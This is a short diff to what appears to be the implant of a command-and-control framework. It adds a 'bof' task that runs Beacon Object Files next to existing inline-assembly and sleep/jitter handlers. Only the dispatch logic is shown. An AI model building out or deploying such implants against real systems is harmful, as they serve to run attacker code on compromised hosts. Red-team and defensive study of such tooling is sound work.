@@ -94,6 +94,9 @@ void Agent::executeTask(Task& task) {
 	else if (task.command == "inline-assembly") {
 		command_output = InlineAssembly(task.arguments, task.file);
 	}
+	else if (task.command == "bof") {
+		command_output = RunBOF(task.arguments, task.file);
+	}
 	else if (task.command == "set_sleep") {
 		if (task.arguments.size() < 2) {
 			command_output = "Error: usage: set_sleep <interval_ms> <jitter_ms>";
